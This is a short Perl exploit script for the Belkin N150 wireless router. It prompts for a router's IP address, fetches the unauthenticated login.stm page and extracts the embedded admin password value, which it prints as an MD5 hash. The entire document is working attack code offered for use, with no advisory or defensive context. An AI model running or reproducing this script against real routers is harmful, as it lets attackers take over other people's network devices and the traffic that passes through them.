=========
Exploit :
=========
  
#/usr/bin/perl
use strict;
use LWP::Simple;
print "\n  'Belkin N150 Wireless Router' Admin Exploit ";
print "\n ---------------------------------------------\n\n";
print "[+] Enter the Router's IP Address : ";
my $ip=<STDIN>;
chomp($ip);
$ip=get("http://".$ip."/login.stm") or die "\n[!] check ip and try again \n";
my @arr=$ip =~ m/var password = "(.*)";/g;
print "[+] Admin Password = ".@arr[0]." (MD5 Hash).\n";
